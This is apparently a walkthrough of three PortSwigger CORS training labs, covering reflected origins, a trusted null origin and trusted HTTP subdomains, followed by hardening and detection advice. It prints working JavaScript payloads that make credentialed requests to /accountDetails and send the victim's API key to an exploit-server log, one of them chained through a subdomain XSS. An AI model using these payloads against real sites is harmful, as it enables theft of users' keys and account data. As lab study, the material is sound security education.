# PortSwigger CORS 1-3 — Origin Trust Is Not Authorization

This is a consolidated walkthrough of the three PortSwigger Cross-origin resource sharing labs.

**CORS is a browser response-reading policy, not an authentication mechanism.** If a sensitive API reflects attacker-controlled origins and allows credentials, an attacker page can read authenticated victim data.

All three labs solved.

## 1. Overview

| # | Lab | CORS flaw | Core idea |
|---|-----|-----------|-----------|
| 1 | basic origin reflection | arbitrary `Origin` reflected with credentials | exploit page reads `/accountDetails` and logs the API key |
| 2 | trusted null origin | `Origin: null` allowed | sandboxed iframe creates a null-origin request |
| 3 | trusted insecure protocols | HTTP subdomains trusted | XSS on `http://stock.LAB` reads HTTPS account details |

## 2. Basic origin reflection

`/accountDetails` contains the user's API key and returns:

```http
Access-Control-Allow-Credentials: true
```

When an arbitrary origin is sent:

```http
Origin: https://example.com
```

the response reflects it:

```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```

The exploit is a credentialed XHR:

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = '/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://LAB/accountDetails', true);
req.withCredentials = true;
req.send();
</script>
```

The exploit server access log receives the victim's account JSON. Extract `apikey` and submit it.

## 3. Trusted null origin

The second lab accepts:

```http
Origin: null
```

A sandboxed iframe can create a null-origin execution context:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = 'https://EXPLOIT/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://LAB/accountDetails', true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

One implementation gotcha: inside `srcdoc`, use a real closing `</script>`. Escaping it as `<\\/script>` prevents the script from closing in the HTML attribute context.

## 4. Trusted insecure protocols

The third lab trusts arbitrary subdomains, including HTTP origins:

```http
Origin: http://stock.LAB.web-security-academy.net
```

The stock subdomain has a reflected XSS in `productId`. The exploit first navigates the victim to:

```text
http://stock.LAB/?productId=4<script>...%3c/script>&storeId=1
```

The injected script runs on the trusted `http://stock.LAB` origin and performs a credentialed XHR to the HTTPS main site:

```js
var req = new XMLHttpRequest();
req.onload = function() {
  location = 'https://EXPLOIT/log?key=' + this.responseText;
};
req.open('GET', 'https://LAB/accountDetails', true);
req.withCredentials = true;
req.send();
```

The important risk is composition: a subdomain XSS becomes a main-site data exposure because the CORS policy trusts the subdomain origin.

## 5. Defense and detection

### Hardening

- Use a strict CORS origin allowlist. Do not reflect arbitrary origins.
- Treat scheme, host, and port as part of the allowlist key.
- Avoid credentialed CORS for sensitive APIs unless there is a narrow, verified frontend origin.
- Reject `Origin: null` for sensitive responses.
- Do not trust wildcard subdomains, especially HTTP subdomains.
- Fix sibling/subdomain XSS because it can turn site-level trust into data access.
- Keep sensitive API responses minimal and independently authorized.

### Detection ideas

- Sensitive endpoints returning both `Access-Control-Allow-Credentials: true` and dynamic `Access-Control-Allow-Origin`.
- ACAO values matching unknown origins, `null`, or HTTP subdomains.
- `/accountDetails` or similar account APIs requested with abnormal `Origin` values.
- External access logs containing account JSON or API-key-shaped data.
- HTTP subdomain pages making credentialed XHR requests to HTTPS main-site APIs.

The durable lesson is that CORS should answer one narrow question: which exact browser origins may read this response? It should never be used as a proxy for whether the user is authorized.
